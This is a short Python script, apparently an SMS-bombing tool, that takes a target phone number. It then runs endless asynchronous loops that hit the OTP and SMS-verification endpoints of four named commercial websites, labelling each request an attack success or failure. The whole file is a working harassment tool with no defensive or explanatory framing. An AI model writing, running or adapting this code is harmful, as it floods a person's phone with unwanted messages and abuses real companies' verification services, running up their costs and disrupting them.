import asyncio
import aiohttp
import sys

with open("config.txt") as file:
    phone = file.read().strip()

phone = ''.join(filter(str.isdigit, phone))

phone = int(sys.argv[1])

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
}



async def api1():
    url = f"https://hdmall.co.th/phone_verifications?mobile={phone}"
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.get(url) as response:
                if response.status == 200:
                    print("API 1 Attack Success Status API : ", response.status)
                else:
                    print("API 1 Attack Fail Status API : ", response.status)


async def api3():
    url = "https://www.easymoney.co.th/estimate/actionSendOtp"
    headers1 = {'content-type': 'application/x-www-form-urlencoded'}
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.post(url, data = {'condition[rakmao]': 'Y','phone': f"{phone}"}, headers=headers1) as response:
                if response.status == 200:
                    print("API 3 Attack Success Status API : ", response.status)
                else:
                    print("API 3 Attack Fail Status API : ", response.status)
                    
                    
async def api4():
    url = "https://www.carsome.co.th/website/login/sendSMS"
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.post(url, json={"username": f"{phone}","optType": 0}) as response:
                if response.status == 200:
                    print("API 4 Attack Success Status API : ", response.status)
                else:
                    print("API 4 Attack Fail Status API : ", response.status)
                    
                    
                    
async def api5():
    url = "https://shopgenix.com/api/sms/otp/"
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.post(url, data={"mobile_country_id": "1", "mobile": f"{phone}"}) as response:
                if response.status == 200:
                    print("API 5 Attack Success Status API : ", response.status)
                else:
                    print("API 5 Attack Fail Status API : ", response.status)



async def main():
    await asyncio.gather(api1(), api3(), api4(), api5())

if __name__ == "__main__":
    asyncio.run(main())
